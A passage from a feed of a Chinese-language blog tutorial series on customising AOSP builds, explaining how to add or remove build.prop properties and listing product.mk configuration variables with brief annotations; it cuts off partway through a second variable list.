<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">android_app_import {
</span></span><span class="line"><span class="cl">	# 省略
</span></span><span class="line"><span class="cl">	uses_libs:[&#34;lib&#34;],
</span></span><span class="line"><span class="cl">	optional_uses_libs:[&#34;可选lib&#34;]
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>从零开始自定义安卓系统(5) 修改prop属性</title><link>https://blue-bird1.github.io/posts/aosp-5/</link><pubDate>Tue, 30 Jan 2024 00:36:53 +0800</pubDate><guid>https://blue-bird1.github.io/posts/aosp-5/</guid><description>从零开始自定义安卓系统(5) 修改prop属性 从product.mk修改 在上一节已经知道 1 2 3 4 5 PRODUCT_SYSTEM_PROPERTIES PRODUCT_SYSTEM_EXT_PROPERTIES PRODUCT_VENDOR_PROPERTIES PRODUCT_ODM_PROPERTIES PRODUCT_PRODUCT_PROPERTIES 这些可以修改prop属性 只需要加一</description><content type="html"><![CDATA[<h2 id="从零开始自定义安卓系统5--修改prop属性">从零开始自定义安卓系统(5)  修改prop属性</h2>
<h3 id="从productmk修改">从product.mk修改</h3>
<p>在上一节已经知道</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PRODUCT_SYSTEM_PROPERTIES
</span></span><span class="line"><span class="cl">PRODUCT_SYSTEM_EXT_PROPERTIES
</span></span><span class="line"><span class="cl">PRODUCT_VENDOR_PROPERTIES
</span></span><span class="line"><span class="cl">PRODUCT_ODM_PROPERTIES
</span></span><span class="line"><span class="cl">PRODUCT_PRODUCT_PROPERTIES
</span></span></code></pre></td></tr></table>
</div>
</div><p>这些可以修改prop属性</p>
<p>只需要加一行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PRODUCT_SYSTEM_PROPERTIES += ro.bluebird = 0
</span></span></code></pre></td></tr></table>
</div>
</div><p>就可以在输出目录里的 <code>out/target/product/bluebird_x86_64_only/system/build.prop </code> 找到新属性.</p>
<p>其他属性对应的是其他文件, 整体对应关系是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PRODUCT_SYSTEM_PROPERTIES: system/build.prop
</span></span><span class="line"><span class="cl">PRODUCT_SYSTEM_EXT_PROPERTIES: system_ext/etc/build.prop
</span></span><span class="line"><span class="cl">PRODUCT_VENDOR_PROPERTIES: vendor/build.prop
</span></span><span class="line"><span class="cl">PRODUCT_PRODUCT_PROPERTIES: product/etc/build.prop
</span></span><span class="line"><span class="cl">PRODUCT_ODM_PROPERTIES: odm/etc/build.prop
</span></span></code></pre></td></tr></table>
</div>
</div><p>对应的文件级设置为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">TARGET_SYSTEM_PROP: system/build.prop
</span></span><span class="line"><span class="cl">TARGET_SYSTEM_EXT_PROP: system_ext/etc/build.prop
</span></span><span class="line"><span class="cl">TARGET_VENDOR_PROP 默认值(/vendor.prop):  vendor/build.prop
</span></span><span class="line"><span class="cl">TARGET_PRODUCT_PROP 默认(/product.prop): product/etc/build.prop
</span></span><span class="line"><span class="cl">TARGET_ODM_PROP 默认(/odm.prop): odm/etc/build.prop
</span></span></code></pre></td></tr></table>
</div>
</div><p>要删除就需要使用</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PRODUCT_SYSTEM_PROPERTY_BLACKLIST : system
</span></span><span class="line"><span class="cl">PRODUCT_VENDOR_PROPERTY_BLACKLIST : vendor
</span></span></code></pre></td></tr></table>
</div>
</div><p>具体实现在<code>build/make/core/sysprop.mk</code> 里面</p>
<p>拿一段举例就是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="c"># ----------------------------------------------------------------
</span></span></span><span class="line"><span class="cl"><span class="c"># odm/etc/build.prop
</span></span></span><span class="line"><span class="cl"><span class="c">#
</span></span></span><span class="line"><span class="cl"><span class="c"></span>
</span></span><span class="line"><span class="cl"><span class="c"># _prop_files_ 决定了文件级参数, 取TARGET_ODM_PROP or /odm.prop
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nv">_prop_files_</span> <span class="o">:=</span> <span class="k">$(if</span> <span class="k">$(</span>TARGET_ODM_PROP<span class="k">)</span>,<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="k">$(</span>TARGET_ODM_PROP<span class="k">)</span>,<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="k">$(</span>wildcard <span class="k">$(</span>TARGET_DEVICE_DIR<span class="k">)</span>/odm.prop<span class="k">)</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="c"># 参数级参数  PRODUCT_ODM_PROPERTIES
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nv">_prop_vars_</span> <span class="o">:=</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    ADDITIONAL_ODM_PROPERTIES <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    PRODUCT_ODM_PROPERTIES
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="c"># 输出路径
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nv">INSTALLED_ODM_BUILD_PROP_TARGET</span> <span class="o">:=</span> <span class="k">$(</span>TARGET_OUT_ODM<span class="k">)</span>/etc/build.prop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 调用build prop文件的函数 参数位置与上述一直
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="k">$(</span><span class="nv">eval</span> <span class="k">$(</span><span class="nv">call</span> <span class="nv">build</span>-<span class="nv">properties</span>,\
</span></span><span class="line"><span class="cl">    <span class="nv">odm</span>,\
</span></span><span class="line"><span class="cl">    <span class="k">$(</span><span class="nv">INSTALLED_ODM_BUILD_PROP_TARGET</span><span class="k">)</span>,\
</span></span><span class="line"><span class="cl">    <span class="k">$(</span><span class="nv">_prop_files_</span><span class="k">)</span>,\
</span></span><span class="line"><span class="cl">    <span class="k">$(</span><span class="nv">_prop_vars_</span><span class="k">)</span>,\
</span></span><span class="line"><span class="cl">    # 从上面删除的参数
</span></span><span class="line"><span class="cl">    <span class="k">$(</span><span class="nv">empty</span><span class="k">)</span>,\
</span></span><span class="line"><span class="cl">    <span class="k">$(</span><span class="nv">empty</span><span class="k">)</span>,\
</span></span><span class="line"><span class="cl">    <span class="k">$(</span><span class="nv">empty</span><span class="k">)))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>实际应用中就是 添加一个 product.prop</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">├── AndroidProducts.mk
</span></span><span class="line"><span class="cl">├── README.md
</span></span><span class="line"><span class="cl">├── bluebird.mk
</span></span><span class="line"><span class="cl">├── bluebird_x86_64_only
</span></span><span class="line"><span class="cl">│   └── BoardConfig.mk
</span></span><span class="line"><span class="cl">└── product.prop
</span></span></code></pre></td></tr></table>
</div>
</div><p>并在bluebird.mk中添加</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PRODUCT_SYSTEM_PROPERTIES += ro.bluebird=1⏎ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>编译运行后就能看到 自己新添加的prop属性了</p>
]]></content></item><item><title>从零开始自定义安卓系统(4) product配置详解</title><link>https://blue-bird1.github.io/posts/aosp-4/</link><pubDate>Sun, 28 Jan 2024 19:10:10 +0800</pubDate><guid>https://blue-bird1.github.io/posts/aosp-4/</guid><description>从零开始自定义安卓系统(4) product配置详解 前言 在学习修改一样东西时, 最好的方法之一就是搞懂他到底可以干什么. 而不是跟一个教程学一个选</description><content type="html"><![CDATA[<h2 id="从零开始自定义安卓系统4-product配置详解">从零开始自定义安卓系统(4) product配置详解</h2>
<h3 id="前言">前言</h3>
<p>在学习修改一样东西时, 最好的方法之一就是搞懂他到底可以干什么. 而不是跟一个教程学一个选项,再跟另一个教程再学一个选项, 结果问到可以做XX么, 还是无法回答.</p>
<p>当然,并不需要记住具体操作, 只需要对可以做什么有印象就可以了.</p>
<h3 id="androidproductsmk"><code>AndroidProducts.mk</code></h3>
<p>读取<code>product</code>的代码位于<code>build/make/core/product_config.mk </code> 和 <code>build/make/core/product.mk</code></p>
<p>其中只使用了这三个变量</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PRODUCT_MAKEFILES
</span></span><span class="line"><span class="cl">COMMON_LUNCH_CHOICES
</span></span><span class="line"><span class="cl"># 选择使用starlark配置 可以无视
</span></span><span class="line"><span class="cl">STARLARK_OPT_IN_PRODUCTS
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="product_makefiles">PRODUCT_MAKEFILES</h3>
<p>然后根据选择读取对应的<code>mk</code>文件</p>
<p>在<code>build/make/core/product.mk</code>定义product自身的属性了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 单个值的列表
</span></span><span class="line"><span class="cl">_product_single_value_vars
</span></span><span class="line"><span class="cl"># 列表值的列表
</span></span><span class="line"><span class="cl">_product_list_vars
</span></span></code></pre></td></tr></table>
</div>
</div><p>完整列表如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># _product_single_value_vars
</span></span><span class="line"><span class="cl"># 定义产品名称和系统名称  如果没定义sytem会自动使用上面的值
</span></span><span class="line"><span class="cl">PRODUCT_NAME
</span></span><span class="line"><span class="cl">PRODUCT_MODEL
</span></span><span class="line"><span class="cl">PRODUCT_DEVICE
</span></span><span class="line"><span class="cl">PRODUCT_MANUFACTURER
</span></span><span class="line"><span class="cl">PRODUCT_BRAND
</span></span><span class="line"><span class="cl">PRODUCT_SYSTEM_NAME
</span></span><span class="line"><span class="cl">PRODUCT_SYSTEM_MODEL
</span></span><span class="line"><span class="cl">PRODUCT_SYSTEM_DEVICE
</span></span><span class="line"><span class="cl">PRODUCT_SYSTEM_BRAND
</span></span><span class="line"><span class="cl">PRODUCT_SYSTEM_MANUFACTURER
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># aapt资源打包工具选项
</span></span><span class="line"><span class="cl">PRODUCT_AAPT_PREF_CONFIG
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 系统特性例如 电视/手表系统
</span></span><span class="line"><span class="cl">PRODUCT_CHARACTERISTICS
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 系统证书
</span></span><span class="line"><span class="cl">PRODUCT_DEFAULT_DEV_CERTIFICATE
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 系统支持的vboot选项 也就是常说的解锁bl锁 
</span></span><span class="line"><span class="cl">PRODUCT_SUPPORTS_BOOT_SIGNER
</span></span><span class="line"><span class="cl">PRODUCT_SUPPORTS_VBOOT
</span></span><span class="line"><span class="cl">PRODUCT_SUPPORTS_VERITY
</span></span><span class="line"><span class="cl">PRODUCT_SUPPORTS_VERITY_FEC
</span></span><span class="line"><span class="cl">PRODUCT_VBOOT_SIGNING_KEY
</span></span><span class="line"><span class="cl">PRODUCT_VBOOT_SIGNING_SUBKEY
</span></span><span class="line"><span class="cl">PRODUCT_VERITY_SIGNING_KEY
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># system jar选项
</span></span><span class="line"><span class="cl">PRODUCT_BROKEN_SUBOPTIMAL_ORDER_OF_SYSTEM_SERVER_JARS
</span></span><span class="line"><span class="cl"># 强制允许system jar
</span></span><span class="line"><span class="cl">PRODUCT_BROKEN_DEPRECATED_MK_SYSTEM_SERVER_JARS
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 顾名思义就是一大堆验证分区选项 
</span></span><span class="line"><span class="cl">PRODUCT_SYSTEM_VERITY_PARTITION
</span></span><span class="line"><span class="cl">PRODUCT_VENDOR_VERITY_PARTITION
</span></span><span class="line"><span class="cl">PRODUCT_PRODUCT_VERITY_PARTITION
</span></span><span class="line"><span class="cl">PRODUCT_SYSTEM_EXT_VERITY_PARTITION
</span></span><span class="line"><span class="cl">PRODUCT_ODM_VERITY_PARTITION
</span></span><span class="line"><span class="cl">PRODUCT_VENDOR_DLKM_VERITY_PARTITION
</span></span><span class="line"><span class="cl">PRODUCT_ODM_DLKM_VERITY_PARTITION
</span></span><span class="line"><span class="cl">PRODUCT_SYSTEM_DLKM_VERITY_PARTITION
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># debug选项
</span></span><span class="line"><span class="cl">PRODUCT_SYSTEM_SERVER_DEBUG_INFO
</span></span><span class="line"><span class="cl">PRODUCT_OTHER_JAVA_DEBUG_INFO
</span></span><span class="line"><span class="cl">PRODUCT_MINIMIZE_JAVA_DEBUG_INFO
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># dex优化选项
</span></span><span class="line"><span class="cl">PRODUCT_DEX_PREOPT_DEFAULT_COMPILER_FILTER
</span></span><span class="line"><span class="cl">PRODUCT_DEX_PREOPT_BOOT_FLAGS
</span></span><span class="line"><span class="cl">PRODUCT_DEX_PREOPT_PROFILE_DIR
</span></span><span class="line"><span class="cl">PRODUCT_DEX_PREOPT_GENERATE_DM_FILES
</span></span><span class="line"><span class="cl">PRODUCT_DEX_PREOPT_NEVER_ALLOW_STRIPPING
</span></span><span class="line"><span class="cl">PRODUCT_DEX_PREOPT_RESOLVE_STARTUP_STRINGS
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># boot镜像选项
</span></span><span class="line"><span class="cl">PRODUCT_EXPORT_BOOT_IMAGE_TO_DIST
</span></span><span class="line"><span class="cl">PRODUCT_USE_PROFILE_FOR_BOOT_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_USES_DEFAULT_ART_CONFIG
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PRODUCT_SYSTEM_SERVER_COMPILER_FILTER
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 文件系统选项
</span></span><span class="line"><span class="cl">PRODUCT_SYSTEM_BASE_FS_PATH
</span></span><span class="line"><span class="cl">PRODUCT_VENDOR_BASE_FS_PATH
</span></span><span class="line"><span class="cl">PRODUCT_PRODUCT_BASE_FS_PATH
</span></span><span class="line"><span class="cl">PRODUCT_SYSTEM_EXT_BASE_FS_PATH
</span></span><span class="line"><span class="cl">PRODUCT_ODM_BASE_FS_PATH
</span></span><span class="line"><span class="cl">PRODUCT_VENDOR_DLKM_BASE_FS_PATH
</span></span><span class="line"><span class="cl">PRODUCT_ODM_DLKM_BASE_FS_PATH
</span></span><span class="line"><span class="cl">PRODUCT_SYSTEM_DLKM_BASE_FS_PATH
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 系统支持的安卓 api lever
</span></span><span class="line"><span class="cl">PRODUCT_SHIPPING_API_LEVEL
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># art 选项 (是一个dex运行技术)
</span></span><span class="line"><span class="cl">PRODUCT_ART_TARGET_INCLUDE_DEBUG_BUILD
</span></span><span class="line"><span class="cl">PRODUCT_ART_USE_READ_BARRIER
</span></span><span class="line"><span class="cl"># 设置系统镜像预留空间
</span></span><span class="line"><span class="cl">PRODUCT_SYSTEM_HEADROOM
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># adb  key
</span></span><span class="line"><span class="cl">PRODUCT_ADB_KEYS
</span></span><span class="line"><span class="cl"># 一个内存分配器 参考 https://source.android.com/docs/security/test/scudo?hl=zh-cn
</span></span><span class="line"><span class="cl">PRODUCT_DISABLE_SCUDO
</span></span><span class="line"><span class="cl"># apex压缩设置 参考 https://source.android.com/docs/core/ota/apex?hl=zh-cn
</span></span><span class="line"><span class="cl">PRODUCT_COMPRESSED_APEX
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># ndk版本
</span></span><span class="line"><span class="cl">PRODUCT_PRODUCT_VNDK_VERSION
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 编译路径设置
</span></span><span class="line"><span class="cl">PRODUCT_ENFORCE_ARTIFACT_PATH_REQUIREMENTS
</span></span><span class="line"><span class="cl"># 必须签名
</span></span><span class="line"><span class="cl">PRODUCT_ENFORCE_ARTIFACT_SYSTEM_CERTIFICATE_REQUIREMENT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 分区API接口限制 简单来说就是 system分区允许使用内部api userdata分区不允许 
</span></span><span class="line"><span class="cl">PRODUCT_ENFORCE_PRODUCT_PARTITION_INTERFACE
</span></span><span class="line"><span class="cl"># 必须执行分区sdk要求
</span></span><span class="line"><span class="cl">PRODUCT_ENFORCE_INTER_PARTITION_JAVA_SDK_LIBRARY
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 额外下载的apex包
</span></span><span class="line"><span class="cl">PRODUCT_INSTALL_EXTRA_FLATTENED_APEXES
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 动态分区
</span></span><span class="line"><span class="cl">PRODUCT_RETROFIT_DYNAMIC_PARTITIONS
</span></span><span class="line"><span class="cl">PRODUCT_SET_DEBUGFS_RESTRICTIONS
</span></span><span class="line"><span class="cl">PRODUCT_USE_DYNAMIC_PARTITIONS
</span></span><span class="line"><span class="cl">PRODUCT_USE_DYNAMIC_PARTITION_SIZE
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 编译镜像设置
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_SUPER_PARTITION
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_GENERIC_OTA_PACKAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_SYSTEM_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_SYSTEM_OTHER_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_VENDOR_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_PRODUCT_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_SYSTEM_EXT_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_ODM_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_VENDOR_DLKM_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_ODM_DLKM_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_SYSTEM_DLKM_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_CACHE_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_RAMDISK_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_USERDATA_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_RECOVERY_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_BOOT_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_INIT_BOOT_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_DEBUG_BOOT_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_VENDOR_BOOT_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_VENDOR_KERNEL_BOOT_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_DEBUG_VENDOR_BOOT_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_VBMETA_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_SUPER_EMPTY_IMAGE
</span></span><span class="line"><span class="cl">PRODUCT_BUILD_PVMFW_IMAGE
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># AB分区设置
</span></span><span class="line"><span class="cl">PRODUCT_VIRTUAL_AB_OTA
</span></span><span class="line"><span class="cl">PRODUCT_VIRTUAL_AB_COMPRESSION
</span></span><span class="line"><span class="cl">PRODUCT_VIRTUAL_AB_OTA_RETROFIT
</span></span><span class="line"><span class="cl">PRODUCT_OTA_FORCE_NON_AB_PACKAGE
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 调试策略
</span></span><span class="line"><span class="cl">PRODUCT_INSTALL_DEBUG_POLICY_TO_SYSTEM_EXT
</span></span><span class="line"><span class="cl"># 文件系统完整性设置
</span></span><span class="line"><span class="cl">PRODUCT_SYSTEM_FSVERITY_GENERATE_METADATA
</span></span><span class="line"><span class="cl"># 建造模块时从源码建造
</span></span><span class="line"><span class="cl">PRODUCT_MODULE_BUILD_FROM_SOURCE
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以发现<code> _product_single_value_vars</code>大部分都是编译设置, 魔改最多修改个名字</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
